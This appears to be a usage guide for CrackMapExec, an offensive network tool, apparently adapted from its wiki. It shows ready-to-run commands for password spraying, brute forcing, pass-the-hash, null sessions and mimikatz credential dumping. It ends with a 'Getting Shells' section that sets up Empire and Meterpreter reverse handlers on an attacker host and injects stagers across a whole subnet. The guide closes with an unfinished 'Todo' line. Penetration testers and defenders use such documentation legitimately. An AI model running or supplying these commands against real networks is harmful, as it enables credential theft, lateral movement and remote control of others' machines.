# CrackMapExec
### Target Formats

Every protocol supports targets by CIDR notation(s), IP address(s), IP range(s), hostname(s), a file containing a list of targets or combination of all of the latter:

    crackmapexec <protocol\> ms.evilcorp.org
    crackmapexec <protocol\> 192.168.1.0 192.168.0.2
    crackmapexec <protocol\> 192.168.1.0/24
    crackmapexec <protocol\> 192.168.1.0\-28 10.0.0.1\-67
    crackmapexec <protocol\> ~/targets.txt

### Using Credentials

Every protocol supports using credentials in one form or another. For details on using credentials with a specific protocol, see the appropriate wiki section.

Generally speaking, to use credentials, you can run the following commands:

crackmapexec <protocol\> <target(s)\> \-u username \-p password

Note 1: When using usernames or passwords that contain special symbols, wrap them in single quotes to make your shell interpret them as a string.

**EXAMPLE**  

    crackmapexec <protocol\> <target(s)\> \-u username \-p 'Admin!123@'

Note 2: Due to a bug in Python’s argument parsing library, credentials beginning with a dash (-) will throw an expected at least one argument error message. To get around this, specify the credentials by using the ‘long’ argument format (note the = sign):

    crackmapexec <protocol\> <target(s)\> \-u\='-username' \-p\='-Admin!123@'

#### Using a credential set from the database

By specifying a credential ID (or multiple credential IDs) with the -id flag CME will automatically pull that credential from the back-end database and use it to authenticate (saves a lot of typing):

    crackmapexec <protocol\> <target(s)\> \-id <cred ID(s)\>

#### Brute Forcing & Password Spraying

All protocols support brute-forcing and password spraying. For details on brute-forcing/password spraying with a specific protocol, see the appropriate wiki section.

By specifying a file or multiple values CME will automatically brute-force logins for all targets using the specified protocol:

    crackmapexec <protocol\> <target(s)\> \-u username1 \-p password1 password2

    crackmapexec <protocol\> <target(s)\> \-u username1 username2 \-p password1

    crackmapexec <protocol\> <target(s)\> \-u ~/file\_containing\_usernames \-p ~/file\_containing\_passwords

    crackmapexec <protocol\> <target(s)\> \-u ~/file\_containing\_usernames \-H ~/file\_containing\_ntlm\_hashes

### Using Modules

#### List them

    cme <protocol\> \-L

**EXAMPLE**  

    #~ cme smb -L
    \[\*\] met\_inject                Downloads the Meterpreter stager and injects it into memory
    \[\*\] get\_keystrokes            Logs keys pressed, time and the active window
    \[\*\] empire\_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it

    \-- SNIP \--

#### To run a module

    cme <protocol\> <target(s)\> \-M <module name\>

**EXAMPLE**  

    crackmapexec smb <target(s)\> \-u Administrator \-p 'P@ssw0rd' \-M mimikatz

#### Viewing module options

    cme <protocol\> \-M <module name\> \--options

**EXAMPLE**  

    #~ cme smb -M mimikatz --options
  
Module options are specified with the -o flag. All options are specified in the form of KEY=value (msfvenom style)

**Example**  

    #~ cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'

### Database

CME automatically stores all used/dumped credentials (along with other information) in it’s database which is setup on first run.  

As of CME v4 each protocol has it’s own database which makes things much more sane and allows for some awesome possibilities. Additionally, v4 introduces workspaces (similar to Metasploit).  

For details and usage of a specific protocol’s database see the appropriate wiki section.  

All workspaces and their relative databases are stored in ~/.cme/workspaces  

CME ships with a secondary command line script cmedb which abstracts interacting with the back-end database. Typing the command cmedb will drop you into a command shell:   

    #~ cmedb
    cmedb (default) \>
  
#### Workspaces
The default workspace name is called ‘default’ (as represented within the prompt), once a workspace is selected everything that you do in CME will be stored in that workspace.  
  
To create a workspace:

    cmedb (default) \> workspace create test
    \[\*\] Creating workspace 'test'
    \[\*\] Initializing HTTP protocol database
    \[\*\] Initializing SMB protocol database
    \[\*\] Initializing MSSQL protocol database
    cmedb (test) \>

To switch workspace:

    cmedb (test) \> workspace default
    cmedb (default) \>

#### Protocol DB
To access a protocol’s database simply run proto <protocol>, for example:

    cmedb (test) \> proto smb
    cmedb (test)(smb) \>
    help
  
Using Credentials
-------------------------------------------------------

### Passing-the-Hash
CME supports authenticating via SMB using Passing-The-Hash attacks with the -H flag:  
  
    crackmapexec smb <target(s)\> \-u username \-H LMHASH:NTHASH
    crackmapexec smb <target(s)\> \-u username \-H NTHASH
  
### NULL Sessions
You can log in with a null session by using ‘’ as the username and/or password  
  
    crackmapexec smb <target(s)\> \-u '' \-p ''
    
Getting Shells
---------------------------------------------------------------
  
We all love shells and that’s why CME makes it as easy as possible to get them! There really is something magical about shelling a /24  

### Empire Agent

We can use the empire\_exec module to execute an Empire Agent’s initial stager. In the background, the module connects to Empire’s RESTful API, generates a launcher for the specified listener and executes it.

*   First setup an Empire listener:

 (Empire: listeners) \> set Name test
(Empire: listeners) \> set Host 192.168.10.3
(Empire: listeners) \> set Port 9090
(Empire: listeners) \> set CertPath data/empire.pem
(Empire: listeners) \> run
(Empire: listeners) \> list

\[\*\] Active listeners:

 ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
 \--    \----              \----                                 \-------   \------------   \--------    \---------------
 1     test              http://192.168.10.3:9090                 native    5/0.0

(Empire: listeners) \>

*   Start up Empire’s RESTful API server:

 #~ python empire --rest --user empireadmin --pass Password123!

\[\*\] Loading modules from: /home/byt3bl33d3r/Tools/Empire/lib/modules/
 \* Starting Empire RESTful API on port: 1337
 \* RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml
 \* Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)

The username and password that CME uses to authenticate to Empire’s RESTful API are stored in the cme.conf file located at ~/.cme/cme.conf:

 \[Empire\]
api\_host=127.0.0.1
api\_port=1337
username=empireadmin
password=Password123!

\[Metasploit\]
rpc\_host=127.0.0.1
rpc\_port=55552
password=abc123

*   Then just run the empire\_exec module and specify the listener name:

#~ crackmapexec 192.168.10.0/24 -u username -p password -M empire\_exec -o LISTENER=test

### Meterpreter
We can use the metinject module to directly inject meterpreter into memory using PowerSploit’s Invoke-Shellcode.ps1 script.

*   First setup your handler:

 msf \> use exploit/multi/handler
msf exploit(handler) \> set payload windows/meterpreter/reverse\_https
payload \=> windows/meterpreter/reverse\_https
msf exploit(handler) \> set LHOST 192.168.10.3
LHOST \=> 192.168.10.3
msf exploit(handler) \> set exitonsession false
exitonsession \=> false
msf exploit(handler) \> exploit \-j
\[\*\] Exploit running as background job.

\[\*\] Started HTTPS reverse handler on https://192.168.10.3:8443
msf exploit(handler) \> \[\*\] Starting the payload handler...

*   Then just run the metinject module and specify the LHOST and LPORT values:

#~ crackmapexec 192.168.10.0/24 -u username -p password -M metinject -o LHOST=192.168.10.3 LPORT=8443

Todo

FInish
